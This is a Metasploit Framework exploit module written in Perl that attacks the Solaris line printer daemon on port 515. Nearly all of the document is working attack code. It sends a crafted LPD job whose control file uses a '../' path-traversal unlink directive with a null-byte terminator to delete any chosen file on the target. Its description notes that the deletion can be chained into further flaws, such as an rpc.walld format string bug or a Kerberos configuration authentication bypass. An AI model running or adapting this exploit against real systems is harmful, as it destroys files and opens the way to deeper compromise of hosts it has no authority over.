Solaris <= 10 LPD Arbitrary File Delete Exploit (metasploit)
============================================================

##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::solaris_lpd_unlink;
use base "Msf::Exploit";
use IO::Socket;
use IO::Select;
use strict;
use Pex::Text;

my $advanced = { };

my $info =
  {
	&#039;Name&#039;		=> &#039;Solaris LPD Arbitrary File Delete&#039;,
	&#039;Version&#039;	=> &#039;$Revision: 1.6 $&#039;,
	&#039;Authors&#039;	=>
	  [
		&#039;H D Moore <hdm [at] metasploit.com>&#039;,
		&#039;Optyx <optyx [at] uberhax0r.net>&#039;
	  ],

	&#039;Arch&#039;		=> [ ],
	&#039;OS&#039;		=> [ &#039;solaris&#039; ],

	&#039;UserOpts&#039;  =>
	  {
		&#039;RHOST&#039; => [1, &#039;ADDR&#039;, &#039;The target address&#039;],
		&#039;RPORT&#039; => [1, &#039;PORT&#039;, &#039;The LPD server port&#039;, 515],
		&#039;RPATH&#039; => [1, &#039;DATA&#039;, &#039;The remote path name to delete&#039;],
	  },

	&#039;Description&#039;  => Pex::Text::Freeform(qq{
		This module uses a vulnerability in the Solaris line printer daemon
	to delete arbitrary files on an affected system. This can be used to exploit
	the rpc.walld format string flaw, the missing krb5.conf authentication bypass,
	or simple delete system files. Tested on Solaris 2.6, 7, 8, 9, and 10. 
}),

	&#039;Refs&#039;  =>
	  [
		[&#039;URL&#039;, &#039;http://sunsolve.sun.com/search/document.do?assetkey=1-26-101842-1&#039;],
	  ],

	&#039;DefaultTarget&#039; => 0,
	&#039;Targets&#039; => [[&#039;No Target Needed&#039;]],

	&#039;Keys&#039;  => [&#039;lpd&#039;],
  };

sub new {
	my $class = shift;
	my $self = $class->SUPER::new({&#039;Info&#039; => $info, &#039;Advanced&#039; => $advanced}, @_);
	return($self);
}

sub Exploit {
	my $self = shift;
	my $target_host = $self->GetVar(&#039;RHOST&#039;);
	my $target_port = $self->GetVar(&#039;RPORT&#039;);
	my $target_path = $self->GetVar(&#039;RPATH&#039;);
	my $res;

	# We use one connection to configure the spool directory
	my $s = Msf::Socket::Tcp->new
	  (
		&#039;PeerAddr&#039;  => $target_host,
		&#039;PeerPort&#039;  => $target_port,
		&#039;LocalPort&#039; => $self->GetVar(&#039;CPORT&#039;),
		&#039;SSL&#039;       => $self->GetVar(&#039;SSL&#039;),
	  );
	if ($s->IsError) {
		$self->PrintLine(&#039;[*] Error creating socket: &#039; . $s->GetError);
		return;
	}

	# Send a job request that will trigger the cascade adaptor (thanks Dino!)
	$s->Send("\x02"."metasploit:framework\n");
	$res = $s->Recv(1, 5);
	if (ord($res) != 0) {
		$self->PrintLine("[*] The target did not accept our job request command");
		return;
	}

	# The job ID is squashed down to three decimal digits
	my $jid = ($$ % 1000).unpack("H*",pack(&#039;N&#039;, time() + $$));

	# Create a simple control file...
	my $control = "Hmetasploit\nPr00t\n";

	# Theoretically, we could delete multiple files at once, however
	# the lp daemon will append garbage from memory to the path name
	# if we don&#039;t stick a null byte after the path. Unfortunately, this
	$control .= "U".("../" x 10)."$target_path\x00\n";

	my $dataf = "http://metasploit.com/\n";

	$self->PrintLine("[*] Sending the malicious cascaded job request...");
	if ( ! $self->SendFile($s, 2, "cfA".$jid."metasploit", $control) ||
		! $self->SendFile($s, 3, "dfa".$jid."metasploit", $dataf)  ||
		0
	  ) { $s->Close; return }

	$self->PrintLine(&#039;&#039;);
	$self->PrintLine("[*] Successfully deleted $target_path >:-]");
	return;
}

sub SendFile {
	my $self = shift;
	my $sock = shift;
	my $type = shift;
	my $name = shift;
	my $data = shift;

	$sock->Send(chr($type) .length($data). " $name\n");
	my $res = $sock->Recv(1, 5);
	if (ord($res) != 0) {
		$self->PrintLine("[*] The target did not accept our control file command ($name)");
		return;
	}

	$sock->Send($data);
	$sock->Send("\x00");
	$res = $sock->Recv(1, 5);
	if (ord($res) != 0) {
		$self->PrintLine("[*] The target did not accept our control file data ($name)");
		return;
	}

	$self->PrintLine(sprintf("[*]     Uploaded %.4d bytes >> $name", length($data)));
	return 1;
}

1;


